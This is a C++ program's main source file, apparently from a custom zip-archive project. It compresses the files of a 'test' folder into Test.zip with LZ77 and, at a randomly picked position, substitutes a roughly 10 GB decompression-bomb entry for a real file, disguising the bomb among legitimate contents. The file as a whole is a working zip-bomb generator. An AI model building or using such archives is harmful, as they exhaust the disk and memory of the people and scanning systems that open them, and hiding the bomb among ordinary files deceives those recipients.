#include <chrono>
#include <fstream>

#include "../include/zip_file_construction/LocalFileHeader.h"
#include "Helper.h"
#include "Timer.h"
#include "deflation/Lz77.h"
#include "zip_file_construction/ZipFile.h"

#include <iostream>
#include <filesystem>
#include <random>
#include <algorithm>

namespace {
    enum class ByteSizeBaseKB:size_t {
        MB = 1024,
        GB = MB * 1024,
        TB = GB * 1024,
        PB = TB * 1024
    };

    size_t randomNumber(const size_t max) {

        std::random_device rd;
        std::mt19937_64 gen(rd());

        return gen()%max;
    }

    std::vector<uint8_t> readFile(const std::string &filePath) {
        std::ifstream in(filePath, std::ios::binary | std::ios::ate);
        if (!in) {
            std::cout << "failed to open Input file : "<<filePath<<" \n";
            return {};
        }

        const long long fileSize { in.tellg()};

        std::vector<uint8_t> fileDate(fileSize);
        in.seekg(0, std::ios::beg);

        in.read(reinterpret_cast<char *>(fileDate.data()), fileSize);

        return fileDate;
    }
}



int main() {
    try {
        std::string zipFileName{"Test.zip"};
        Timer totalRuntime{"Total Runtime"};

        namespace fs = std::filesystem;

        std::string folderName{"test"};
        ZipFile zipFile{zipFileName};

        size_t fileCount { static_cast<size_t>(std::count_if(
            fs::recursive_directory_iterator(folderName, fs::directory_options::skip_permission_denied),
            fs::recursive_directory_iterator{},
            [](const fs::directory_entry& e){ return e.is_regular_file(); }))};

        size_t bombPlacement {randomNumber(fileCount)};

        size_t nthFileRead{};
        for (const fs::directory_entry& entry : fs::recursive_directory_iterator(folderName,fs::directory_options::skip_permission_denied)) {
            if (is_regular_file(entry)) {
                std::string fileName{entry.path().filename().string()};
                if (nthFileRead == bombPlacement) {
                    Timer readFileTimer{"Placing Bomb in File - "+fileName};
                    LocalFileHeader bombFile {LocalFileHeader::createBomb(fileName, (static_cast<size_t>(ByteSizeBaseKB::GB) * 10))};
                    zipFile.addFile(bombFile);
                }else {
                    Timer readFileTimer{"Compressing File - "+fileName};
                    std::vector<uint8_t> fileData{readFile(entry.path().string())};
                    LocalFileHeader compressedFileHeader { lz77::fixedCompress(fileName,fileData)};
                    zipFile.addFile(compressedFileHeader);
                }

            }
            ++nthFileRead;
        }


        {
            Timer zipFileSerialization{"Closing zip file"};
            zipFile.close();
        }


    } catch (std::exception &e) {
        std::cout << "exception: " << e.what() << std::endl;
    }
}
;